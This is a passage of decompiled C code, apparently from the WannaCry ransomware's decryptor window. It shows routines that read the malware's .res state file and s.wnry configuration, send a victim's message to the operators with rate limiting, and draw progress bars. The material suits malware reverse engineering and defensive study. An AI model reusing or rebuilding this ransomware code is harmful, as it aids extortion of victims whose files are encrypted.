{
  char cVar1;
  FILE *_File;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  char *pcVar6;
  char *pcVar7;
  undefined4 *puVar8;
  char local_bc;
  undefined4 local_bb [12];
  undefined4 local_88;
  undefined4 local_84 [33];
  
  iVar2 = 0xc;
  local_bc = '\0';
  puVar5 = local_bb;
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined *)puVar5 = 0;
  iVar2 = 0x21;
  local_88 = 0;
  puVar5 = local_84;
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  _File = fopen(s_00000000_res_0041fb74,(char *)&_Mode_0041fb84);
  if (_File != (FILE *)0x0) {
    fread(&local_88,0x88,1,_File);
    fclose(_File);
    FUN_0040be90(s_s_wnry_0041fb54,(char *)(param_1 + 0x6ea),(char *)(param_1 + 0x74e));
    iVar2 = FUN_0040c4f0();
    FUN_0040c670();
    if (iVar2 == -1) {
      iVar2 = FUN_0040c4f0();
    }
    FUN_0040c670();
    if (iVar2 == 1) {
      uVar3 = 0xffffffff;
      pcVar6 = &local_bc;
      do {
        if (uVar3 == 0) break;
        uVar3 = uVar3 - 1;
        cVar1 = *pcVar6;
        pcVar6 = pcVar6 + 1;
      } while (cVar1 != '\0');
      if (0x1d < ~uVar3 - 1) {
        uVar3 = 0xffffffff;
        pcVar6 = &local_bc;
        do {
          if (uVar3 == 0) break;
          uVar3 = uVar3 - 1;
          cVar1 = *pcVar6;
          pcVar6 = pcVar6 + 1;
        } while (cVar1 != '\0');
        if (~uVar3 - 1 < 0x32) {
          uVar3 = 0xffffffff;
          pcVar6 = &local_bc;
          do {
            pcVar7 = pcVar6;
            if (uVar3 == 0) break;
            uVar3 = uVar3 - 1;
            pcVar7 = pcVar6 + 1;
            cVar1 = *pcVar6;
            pcVar6 = pcVar7;
          } while (cVar1 != '\0');
          uVar3 = ~uVar3;
          uVar4 = uVar3 >> 2;
          puVar5 = (undefined4 *)(pcVar7 + -uVar3);
          puVar8 = (undefined4 *)(param_1 + 0x5be);
          while (uVar4 != 0) {
            uVar4 = uVar4 - 1;
            *puVar8 = *puVar5;
            puVar5 = puVar5 + 1;
            puVar8 = puVar8 + 1;
          }
          uVar3 = uVar3 & 3;
          while (uVar3 != 0) {
            uVar3 = uVar3 - 1;
            *(undefined *)puVar8 = *(undefined *)puVar5;
            puVar5 = (undefined4 *)((int)puVar5 + 1);
            puVar8 = (undefined4 *)((int)puVar8 + 1);
          }
          FUN_00401a10((void *)(param_1 + 0x50c),0);
        }
      }
    }
  }
  return;
}

void __fastcall FUN_004080c0(void *param_1)

{
  char cVar1;
  HANDLE hFindFile;
  FILE *_File;
  size_t sVar2;
  BOOL BVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  WPARAM WVar6;
  int iVar7;
  int extraout_ECX;
  int extraout_ECX_00;
  int *piVar8;
  undefined4 *puVar9;
  char *pcVar10;
  int *piVar11;
  undefined *local_710;
  int local_70c;
  int local_708;
  HANDLE local_704;
  int local_700 [24];
  int local_6a0;
  int local_688;
  undefined4 local_684;
  undefined4 local_680;
  int local_678 [34];
  byte local_5f0 [44];
  char local_5c4 [276];
  char local_4b0 [100];
  char local_44c [100];
  char local_3e8;
  undefined4 local_3e7;
  
  iVar7 = 0x21;
  piVar8 = local_700;
  while (piVar8 = piVar8 + 1, iVar7 != 0) {
    iVar7 = iVar7 + -1;
    *piVar8 = 0;
  }
  iVar7 = 0xf9;
  local_3e8 = (char)this_00421798;
  puVar9 = &local_3e7;
  while (iVar7 != 0) {
    iVar7 = iVar7 + -1;
    *puVar9 = 0;
    puVar9 = puVar9 + 1;
  }
  *(undefined2 *)puVar9 = 0;
  local_70c = 0;
  *(undefined *)((int)puVar9 + 2) = 0;
  local_710 = (undefined *)param_1;
  local_704 = FindFirstFileA(s___res_0042077c,(LPWIN32_FIND_DATAA)local_5f0);
  if (local_704 != (HANDLE)0xffffffff) {
    do {
      if ((local_5f0[0] & 0x10) == 0) {
        iVar7 = -1;
        pcVar10 = local_5c4;
        do {
          if (iVar7 == 0) break;
          iVar7 = iVar7 + -1;
          cVar1 = *pcVar10;
          pcVar10 = pcVar10 + 1;
        } while (cVar1 != '\0');
        if (((iVar7 == -0xe) && (iVar7 = sscanf(local_5c4,s__08X_res_0041fb68), 0 < iVar7)) &&
           (_File = fopen(local_5c4,(char *)&_Mode_0041fb84), _File != (FILE *)0x0)) {
          sVar2 = fread(local_678,0x88,1,_File);
          if ((sVar2 == 1) && (local_678[2] == local_708)) {
            local_70c = local_70c + 1;
          }
          fclose(_File);
          if (local_678[2] == 0) {
            iVar7 = 0x22;
            piVar8 = local_678;
            piVar11 = local_700;
            while (iVar7 != 0) {
              iVar7 = iVar7 + -1;
              *piVar11 = *piVar8;
              piVar8 = piVar8 + 1;
              piVar11 = piVar11 + 1;
            }
          }
        }
      }
      hFindFile = local_704;
      BVar3 = FindNextFileA(local_704,(LPWIN32_FIND_DATAA)local_5f0);
    } while (BVar3 != 0);
    FindClose(hFindFile);
    param_1 = local_710;
  }
  uVar4 = FUN_00401e30(local_688,local_4b0);
  uVar5 = FUN_00401e30(local_6a0,local_44c);
  sprintf(&local_3e8,s______s__s__d__I64d__d_00421248,uVar5,uVar4,local_684,local_680);
  local_710 = &stack0xfffff8d8;
  iVar7 = extraout_ECX;
  CString((CString *)&stack0xfffff8d8,&local_3e8);
  WVar6 = FUN_004082c0(param_1,iVar7);
  if (WVar6 == 0xffffffff) {
    local_710 = &stack0xfffff8d8;
    iVar7 = extraout_ECX_00;
    CString((CString *)&stack0xfffff8d8,&local_3e8);
    FUN_004082c0(param_1,iVar7);
  }
  return;
}

// WARNING: Could not reconcile some variable overlaps

WPARAM __thiscall FUN_004082c0(void *this,int param_1)

{
  CString CVar1;
  undefined3 extraout_var;
  WPARAM WVar2;
  FILE *_File;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *in_FS_OFFSET;
  time_t tVar5;
  int local_res0;
  char *local_98;
  undefined4 local_94 [33];
  undefined4 local_10;
  undefined4 uStack12;
  undefined4 local_8;
  uint local_4;
  
  local_8 = &LAB_00413fce;
  uStack12 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &uStack12;
  local_4 = 0;
  if (1000 < *(int *)(param_1 + -8)) {
    CVar1 = Mid((CString *)&param_1,(int)&local_98,0);
    local_8._0_1_ = 1;
    operator_((CString *)register0x00000010,(CString *)CONCAT31(extraout_var,CVar1));
    local_8 = (undefined *)((uint)local_8._1_3_ << 8);
    _CString((CString *)&stack0xffffff64);
  }
  if (*(int *)(local_res0 + -8) < 10) {
    if (param_1 != 0) {
      AfxMessageBox(s_Too_short_message__00421388,0,0);
    }
    local_8 = (undefined *)0xffffffff;
    _CString((CString *)register0x00000010);
    WVar2 = 0xffffffff;
    goto LAB_00408562;
  }
  tVar5 = time((time_t *)0x0);
  if (((int)tVar5 - DAT_004218a8 < 0xb4) && (DAT_004218ac < 3)) {
    DAT_004218ac = DAT_004218ac + 1;
LAB_004083af:
    if (2 < DAT_004218ac) {
      if (param_1 != 0) {
        CString((CString *)&stack0xffffff64);
        local_8 = (undefined *)CONCAT31(local_8._1_3_,2);
        tVar5 = time((time_t *)0x0);
        Format((CString *)(0x3d - ((int)tVar5 - DAT_004218a8) / 0x3c),&stack0xffffff64);
        AfxMessageBox(local_98,0,0);
        local_4 = local_4 & 0xffffff00;
        _CString((CString *)&local_98);
      }
      local_8 = (undefined *)0xffffffff;
      _CString((CString *)register0x00000010);
      WVar2 = 0xffffffff;
      goto LAB_00408562;
    }
  }
  else {
    tVar5 = time((time_t *)0x0);
    if ((int)tVar5 - DAT_004218a8 < 0xe11) goto LAB_004083af;
    DAT_004218ac = 0;
  }
  iVar3 = 0x21;
  local_98 = (char *)0x0;
  puVar4 = local_94;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  _File = fopen(s_00000000_res_0041fb74,(char *)&_Mode_0041fb84);
  if (_File == (FILE *)0x0) {
    local_8 = (undefined *)0xffffffff;
    _CString((CString *)register0x00000010);
    WVar2 = 0xffffffff;
  }
  else {
    fread(&local_98,0x88,1,_File);
    fclose(_File);
    FUN_0040be90(s_s_wnry_0041fb54,(char *)((int)this + 0x6ea),(char *)((int)this + 0x74e));
    WVar2 = FUN_0040c060();
    FUN_0040c670();
    if ((int)WVar2 < 0) {
      if (param_1 != 0) {
        AfxMessageBox(s_Failed_to_send_your_message__Ple_00421260,0x30,0);
      }
    }
    else {
      if (param_1 != 0) {
        AfxMessageBox(s_Your_message_has_been_sent_succe_00421318,0x40,0);
        tVar5 = time((time_t *)0x0);
        DAT_004218a8 = (int)tVar5;
      }
    }
    local_8 = (undefined *)0xffffffff;
    _CString((CString *)register0x00000010);
  }
LAB_00408562:
  *in_FS_OFFSET = local_10;
  return WVar2;
}

CButton * __thiscall FUN_00408580(void *this,byte param_1)

{
  _CButton((CButton *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CButton *)this;
}

CRichEditCtrl * __thiscall FUN_004085a0(void *this,byte param_1)

{
  _CRichEditCtrl((CRichEditCtrl *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CRichEditCtrl *)this;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 * __fastcall FUN_004085c0(undefined4 *param_1)

{
  DWORD DVar1;
  BOOL BVar2;
  undefined4 *in_FS_OFFSET;
  int local_18;
  DWORD local_14;
  undefined4 *local_10;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413ff3;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  local_10 = param_1;
  CWnd((CWnd *)param_1);
  *param_1 = 0x4157f0;
  local_4 = 0;
  CDWordArray((CDWordArray *)(param_1 + 0x10));
  param_1[0x1d] = 0;
  param_1[0x1e] = 0;
  param_1[0x1f] = 0;
  param_1[0x20] = 0;
  local_4 = CONCAT31(local_4._1_3_,1);
  *param_1 = 0x4161a4;
  DVar1 = GetSysColor(0xf);
  param_1[0x16] = DVar1;
  DVar1 = GetSysColor(9);
  param_1[0x18] = DVar1;
  DVar1 = GetSysColor(0x12);
  param_1[0x19] = DVar1;
  DVar1 = GetSysColor(2);
  local_18 = 0;
  local_14 = DVar1;
  BVar2 = SystemParametersInfoA(0x1008,0,&local_18,0);
  if ((BVar2 != 0) && (local_18 != 0)) {
    DVar1 = GetSysColor(0x1b);
  }
  SetSize((CDWordArray *)(param_1 + 0x10),2,-1);
  *(DWORD *)param_1[0x11] = local_14;
  *(DWORD *)(param_1[0x11] + 4) = DVar1;
  param_1[0x1c] = 10;
  param_1[0x1a] = 0;
  param_1[0x1b] = 0x28;
  param_1[0x15] = 0;
  param_1[0x17] = 0;
  *in_FS_OFFSET = local_c;
  return param_1;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_004086e0(int *param_1)

{
  int iVar1;
  HDC pHVar2;
  HBRUSH hbr;
  RECT *lprc;
  int *piVar3;
  uint uVar4;
  undefined4 *in_FS_OFFSET;
  HDC__ local_f4;
  HDC local_f0;
  uint local_ec;
  int local_e8;
  undefined **local_e4;
  undefined auStack224 [4];
  int local_dc;
  int *local_d8;
  int local_d4;
  int local_d0;
  int local_cc;
  int local_c8;
  uint local_c4;
  HDC__ *local_c0;
  ulong local_bc;
  tagRECT local_b8;
  LRESULT local_a8;
  int local_a4;
  int local_a0;
  int local_9c;
  undefined4 local_98;
  undefined4 uStack148;
  undefined4 local_90;
  int local_8c;
  undefined4 local_88;
  int local_84;
  undefined4 local_80;
  uint local_7c;
  int local_78;
  HDC local_74;
  uint local_70;
  int local_6c;
  undefined auStack32 [4];
  int aiStack28 [4];
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00414055;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  CPaintDC((CPaintDC *)&local_78,(CWnd *)param_1);
  local_4 = 0;
  GetClientRect((HWND)param_1[8],(LPRECT)&local_b8);
  local_a8 = SendMessageA((HWND)param_1[8],0x408,0,0);
  GetRange((CProgressCtrl *)param_1,&local_a4,&local_a0);
  CDC((CDC *)&local_f4);
  local_4._0_1_ = 1;
  FUN_00407640(&local_e4);
  local_e4 = &PTR_LAB_0041675c;
  local_c4 = (uint)(local_6c == 0);
  local_d8 = &local_78;
  local_4._0_1_ = 2;
  local_f4 = &PTR_LAB_004166e0;
  local_dc = 0;
  if (local_6c == 0) {
    (**(code **)(local_78 + 0x58))(&local_d4);
    pHVar2 = CreateCompatibleDC((HDC)(-(uint)((undefined *)register0x00000010 != &DAT_00000074) &
                                     local_70));
    Attach((CDC *)&local_f0,(HDC__ *)pHVar2);
    FUN_00409e70(auStack224,(int)&local_74,local_c8 - local_d0,local_c4 - local_cc);
    local_d8 = (int *)FUN_00409f10(&local_f0,(int)auStack224);
    SetWindowOrg((CDC *)&local_f0,(int)auStack32,local_d0);
  }
  else {
    local_e8 = local_6c;
    local_ec = local_70;
    local_f0 = local_74;
  }
  local_c0 = &local_f4;
  local_4._0_1_ = 3;
  iVar1 = param_1[0x17];
  if (iVar1 == 0) {
    FillSolidRect((CDC *)&local_f4,&local_b8,param_1[0x16]);
  }
  else {
    if (iVar1 == 0) {
      hbr = (HBRUSH)0x0;
    }
    else {
      hbr = *(HBRUSH *)(iVar1 + 4);
    }
    FillRect(local_f0,(RECT *)&local_b8,hbr);
  }
  DeflateRect((CRect *)&local_b8,(tagRECT *)(param_1 + 0x1d));
  if ((local_a8 < local_a4) || (local_a0 < local_a8)) {
    local_f4 = &PTR_LAB_004166e0;
    local_4._0_1_ = 5;
    if (local_c4 == 0) {
      local_ec = 0;
      local_f0 = (HDC)0x0;
    }
    else {
      FUN_00409f80(local_d8,local_d4,local_d0,local_cc - local_d4,local_c8 - local_d0,(HDC)&local_f4
                   ,local_d4,local_d0,0xcc0020);
      if (local_dc == 0) {
        SelectGdiObject((HDC__ *)local_f0,(void *)0x0);
      }
      else {
        SelectGdiObject((HDC__ *)local_f0,*(void **)(local_dc + 4));
      }
    }
    local_4._0_1_ = 4;
  }
  else {
    local_bc = GetStyle((CWnd *)param_1);
    uVar4 = local_bc & 0x8000;
    local_7c = local_bc & 0x2000;
    local_9c = 0;
    local_98 = 0;
    local_90 = 0;
    local_8c = 0;
    local_88 = 0;
    local_80 = 0;
    if ((local_bc & 4) == 0) {
      local_84 = local_b8.right - local_b8.left;
    }
    else {
      local_84 = local_b8.bottom - local_b8.top;
    }
    uStack148 = _ftol();
    if (uVar4 != 0) {
      local_9c = _ftol();
    }
    iVar1 = param_1[0x15];
    if (iVar1 == 0) {
      piVar3 = &local_9c;
      if (local_7c == 0) {
        piVar3 = &local_8c;
      }
      (**(code **)(*param_1 + 0xc0))(&local_c0,piVar3,&local_9c);
    }
    else {
      lprc = (RECT *)FUN_00409d40(aiStack28,(int)&local_c0,&local_9c);
      if (iVar1 == 0) {
        FillRect(local_f0,lprc,(HBRUSH)0x0);
      }
      else {
        FillRect(local_f0,lprc,*(HBRUSH *)(iVar1 + 4));
      }
    }
    (**(code **)(*param_1 + 200))(&local_c0,&local_8c,&local_9c);
    local_f4 = &PTR_LAB_004166e0;
    local_4._0_1_ = 7;
    if (local_c4 == 0) {
      local_ec = 0;
      local_f0 = (HDC)0x0;
      local_4._0_1_ = 6;
    }
    else {
      FUN_00409f80(local_d8,local_d4,local_d0,local_cc - local_d4,local_c8 - local_d0,(HDC)&local_f4
                   ,local_d4,local_d0,0xcc0020);
      FUN_00409f10(&local_f4,local_dc);
      local_4._0_1_ = 6;
    }
  }
  FUN_00409e20(&local_e4);
  local_4 = (uint)local_4._1_3_ << 8;
  _CDC((CDC *)&local_f4);
  local_4 = 0xffffffff;
  _CPaintDC((CPaintDC *)&local_78);
  *in_FS_OFFSET = local_c;
  return;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_00408b40(undefined4 *param_1)

{
  undefined4 *this;
  int y;
  int x;
  HDC hdcSrc;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_0041407b;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x4166e0;
  hdcSrc = (HDC)0x0;
  local_4 = 1;
  if (param_1[0xc] == 0) {
    param_1[2] = 0;
    param_1[1] = 0;
  }
  else {
    y = param_1[9];
    x = param_1[8];
    if (param_1 != (undefined4 *)0x0) {
      hdcSrc = (HDC)param_1[1];
    }
    BitBlt(*(HDC *)(param_1[7] + 4),x,y,param_1[10] - x,param_1[0xb] - y,hdcSrc,x,y,0xcc0020);
    if (param_1[6] == 0) {
      SelectGdiObject((HDC__ *)param_1[1],(void *)0x0);
    }
    else {
      SelectGdiObject((HDC__ *)param_1[1],*(void **)(param_1[6] + 4));
    }
  }
  this = param_1 + 4;
  *this = 0x415c00;
  local_4 = CONCAT31(local_4._1_3_,2);
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  local_4 = 0xffffffff;
  _CDC((CDC *)param_1);
  *in_FS_OFFSET = local_c;
  return;
}

undefined4 * __thiscall FUN_00408c20(void *this,byte param_1)

{
  FUN_00408b40((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void FUN_00408d70(CDC **param_1,int *param_2,int *param_3,uint param_4,float param_5)

{
  CDC **ppCVar1;
  CDC **ppCVar2;
  char cVar3;
  char cVar4;
  char cVar5;
  uint uVar6;
  int iVar7;
  int iVar8;
  HBRUSH pHVar9;
  RECT *lprc;
  tagRECT *ptVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint color;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  undefined4 *in_FS_OFFSET;
  char local_5c;
  char local_58;
  char local_4c;
  undefined **local_44;
  uint local_40;
  int local_3c;
  int local_38;
  int local_34;
  int local_30;
  int aiStack44 [4];
  int aiStack28 [4];
  undefined4 uStack12;
  undefined *puStack8;
  undefined4 local_4;
  
  ppCVar1 = param_1;
  local_4 = 0xffffffff;
  puStack8 = &LAB_004140a0;
  uStack12 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &uStack12;
  uVar12 = param_4 & 0xff;
  uVar16 = ((uint)param_5 & 0xff) - uVar12;
  uVar13 = param_4 >> 8 & 0xff;
  uVar11 = param_4 >> 0x10 & 0xff;
  uVar6 = ((uint)param_5 >> 0x10 & 0xff) - uVar11;
  uVar15 = ((uint)param_5 >> 8 & 0xff) - uVar13;
  color = (int)uVar6 >> 0x1f;
  color = (uVar6 ^ color) - color;
  uVar14 = (int)uVar15 >> 0x1f;
  uVar14 = (uVar15 ^ uVar14) - uVar14;
  uVar6 = uVar14;
  if ((int)uVar14 <= (int)color) {
    uVar6 = color;
  }
  param_4 = (int)uVar16 >> 0x1f;
  param_4 = (uVar16 ^ param_4) - param_4;
  if (((int)param_4 <= (int)uVar6) && (param_4 = uVar14, (int)uVar14 <= (int)color)) {
    param_4 = color;
  }
  if (param_2[2] - *param_2 < (int)param_4) {
    param_4 = param_2[2] - *param_2;
  }
  if (param_4 == 0) {
    param_4 = 1;
  }
  uVar6 = GetDeviceCaps(*(HDC *)(*param_1 + 8),0x26);
  if (((uVar6 & 0x100) == 0) && (1 < (int)param_4)) {
    iVar7 = GetDeviceCaps(*(HDC *)(*ppCVar1 + 8),0xc);
    iVar8 = GetDeviceCaps(*(HDC *)(*ppCVar1 + 8),0xe);
    if (iVar8 * iVar7 < 8) {
      param_4 = 1;
    }
  }
  local_3c = *param_2;
  local_40 = 0;
  local_44 = &PTR_LAB_00415a44;
  local_38 = param_2[1];
  local_34 = param_2[2];
  local_30 = param_2[3];
  local_4 = 0;
  param_1 = (CDC **)0x0;
  if (0 < (int)param_4) {
    do {
      ppCVar2 = param_1;
      iVar7 = *param_2;
      iVar8 = _ftol();
      param_1 = (CDC **)((int)ppCVar2 + 1);
      iVar8 = iVar8 + iVar7;
      local_3c = iVar8;
      local_34 = _ftol();
      local_34 = local_34 + iVar7;
      if (ppCVar2 == (CDC **)(param_4 - 1)) {
        local_34 = param_2[2];
      }
      iVar7 = *param_3;
      if (iVar7 <= local_34) {
        if (iVar8 < iVar7) {
          local_3c = iVar7;
        }
        if (param_3[2] < local_34) {
          local_34 = param_3[2];
        }
        cVar3 = _ftol();
        local_5c = (char)uVar11;
        cVar4 = _ftol();
        local_58 = (char)uVar13;
        cVar5 = _ftol();
        local_4c = (char)uVar12;
        color = (uint)CONCAT21(CONCAT11(cVar3 + local_5c,cVar4 + local_58),cVar5 + local_4c);
        if ((uVar6 & 0x100) == 0) {
          ptVar10 = (tagRECT *)FUN_00409d40(aiStack28,(int)ppCVar1,&local_3c);
          FillSolidRect(*ppCVar1,ptVar10,color);
        }
        else {
          pHVar9 = CreateSolidBrush(color);
          Attach((CGdiObject *)&local_44,pHVar9);
          lprc = (RECT *)FUN_00409d40(aiStack44,(int)ppCVar1,&local_3c);
          FillRect(*(HDC *)(*ppCVar1 + 4),lprc,
                   (HBRUSH)(-(uint)((undefined *)register0x00000010 != (undefined *)0x44) & local_40
                           ));
          DeleteObject((CGdiObject *)&local_44);
        }
        if (param_3[2] <= local_34) break;
      }
    } while ((int)param_1 < (int)param_4);
  }
  local_44 = &PTR_LAB_00415c00;
  local_4 = 1;
  DeleteObject((CGdiObject *)&local_44);
  *in_FS_OFFSET = uStack12;
  return;
}

undefined4 * __thiscall FUN_00409770(void *this,byte param_1)

{
  FUN_00409790((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00409790(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00414168;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x415c00;
  local_4 = 0;
  DeleteObject((CGdiObject *)param_1);
  *param_1 = 0x415bec;
  *in_FS_OFFSET = local_c;
  return;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_004097e0(undefined4 *param_1)

{
  undefined4 *this;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_0041419b;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x41677c;
  local_4 = 1;
  if (param_1[4] != 0) {
    (**(code **)(*(int *)param_1[1] + 0x30))(param_1[4]);
  }
  this = param_1 + 2;
  param_1[4] = 0;
  DeleteObject((CGdiObject *)this);
  *this = 0x415c00;
  local_4 = CONCAT31(local_4._1_3_,2);
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  *param_1 = 0x416794;
  *in_FS_OFFSET = local_c;
  return;
}

void __thiscall FUN_00409870(void *this,undefined4 param_1)

{
  undefined4 uVar1;
  
  uVar1 = (**(code **)(**(int **)((int)this + 4) + 0x30))(param_1);
  if (*(int *)((int)this + 0x10) == 0) {
    *(undefined4 *)((int)this + 0x10) = uVar1;
  }
  DeleteObject((CGdiObject *)((int)this + 8));
  return;
}

undefined4 * __thiscall FUN_004098a0(void *this,byte param_1)

{
  FUN_004097e0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_004098c0(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_004141b8;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x416774;
  local_4 = 0;
  if (param_1[2] != 0) {
    SetBkMode((CDC *)param_1[1],param_1[2]);
  }
  param_1[2] = 0;
  *param_1 = 0x416794;
  *in_FS_OFFSET = local_c;
  return;
}

undefined4 * __thiscall FUN_00409920(void *this,byte param_1)

{
  FUN_004098c0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00409940(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_004141d8;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x416778;
  local_4 = 0;
  if (param_1[2] != -1) {
    (**(code **)(*(int *)param_1[1] + 0x38))(param_1[2]);
    param_1[2] = 0xffffffff;
  }
  *param_1 = 0x416794;
  *in_FS_OFFSET = local_c;
  return;
}

undefined4 * __thiscall FUN_004099a0(void *this,byte param_1)

{
  FUN_00409940((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_004099c0(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_004141f8;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x416770;
  local_4 = 0;
  if (param_1[2] != 0xffffffff) {
    SetTextAlign((CDC *)param_1[1],param_1[2]);
    param_1[2] = 0xffffffff;
  }
  *param_1 = 0x416794;
  *in_FS_OFFSET = local_c;
  return;
}

undefined4 * __thiscall FUN_00409a20(void *this,byte param_1)

{
  FUN_004099c0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void FUN_00409a40(int **param_1,int *param_2,undefined4 param_3,int *param_4)

{
  int *this;
  HRGN pHVar1;
  int *in_FS_OFFSET;
  undefined **local_24;
  undefined4 local_20;
  tagRECT local_1c;
  int iStack12;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00414220;
  iStack12 = *in_FS_OFFSET;
  *(int **)in_FS_OFFSET = &iStack12;
  local_20 = 0;
  local_24 = &PTR_LAB_0041679c;
  this = *param_1;
  local_4 = 0;
  FUN_00409d40((int *)&local_1c,(int)param_1,param_2);
  OffsetRect((LPRECT)&local_1c,-*param_4,-param_4[1]);
  pHVar1 = CreateRectRgn(local_1c.left,local_1c.top,local_1c.right,local_1c.bottom);
  Attach((CGdiObject *)&local_24,pHVar1);
  SelectClipRgn((CDC *)this,(CRgn *)&local_24);
  (**(code **)(*this + 100))(0);
  DeleteObject((CGdiObject *)&stack0xffffffcc);
  local_1c.right = 1;
  DeleteObject((CGdiObject *)&stack0xffffffcc);
  *in_FS_OFFSET = local_1c.left;
  return;
}

long __thiscall FUN_00409b80(void *this,undefined4 param_1)

{
  int iVar1;
  long lVar2;
  
  iVar1 = (**(code **)(*(int *)this + 0xd0))(&param_1,param_1);
  if (iVar1 != 0) {
    return 0;
  }
  lVar2 = Default((CWnd *)this);
  return lVar2;
}

long __thiscall FUN_00409bb0(void *this,undefined4 param_1)

{
  int iVar1;
  long lVar2;
  
  iVar1 = (**(code **)(*(int *)this + 0xd0))(&param_1,param_1);
  if (iVar1 != 0) {
    return 1;
  }
  lVar2 = Default((CWnd *)this);
  return lVar2;
}

int * FUN_00409d40(int *param_1,int param_2,int *param_3)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  
  piVar1 = (int *)(param_2 + 8);
  iVar2 = *piVar1;
  uVar5 = *(uint *)(param_2 + 4) & 0x4000;
  iVar6 = *(int *)(param_2 + 0xc);
  iVar3 = *(int *)(param_2 + 0x10);
  iVar4 = *(int *)(param_2 + 0x14);
  if ((*(uint *)(param_2 + 4) & 4) == 0) {
    if (uVar5 == 0) {
      iVar2 = *param_3;
    }
    else {
      iVar2 = (*(int *)(param_2 + 0x10) - param_3[2]) - *piVar1;
    }
    iVar2 = iVar2 + *piVar1;
    iVar3 = (param_3[2] - *param_3) + iVar2;
  }
  else {
    if (uVar5 == 0) {
      iVar6 = (*(int *)(param_2 + 0x14) - *(int *)(param_2 + 0xc)) - param_3[2];
    }
    else {
      iVar6 = *param_3;
    }
    iVar6 = *(int *)(param_2 + 0xc) + iVar6;
    iVar4 = (param_3[2] - *param_3) + iVar6;
  }
  *param_1 = iVar2;
  param_1[1] = iVar6;
  param_1[2] = iVar3;
  param_1[3] = iVar4;
  return param_1;
}

void __fastcall FUN_00409df0(undefined4 *param_1)

{
  param_1[1] = 0;
  *param_1 = 0x415a30;
  return;
}

undefined4 * __thiscall FUN_00409e00(void *this,byte param_1)

{
  FUN_00409e20((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00409e20(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00414238;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x415c00;
  local_4 = 0;
  DeleteObject((CGdiObject *)param_1);
  *param_1 = 0x415bec;
  *in_FS_OFFSET = local_c;
  return;
}

void __thiscall FUN_00409e70(void *this,int param_1,int param_2,int param_3)

{
  HBITMAP pHVar1;
  
  pHVar1 = CreateCompatibleBitmap(*(HDC *)(param_1 + 4),param_2,param_3);
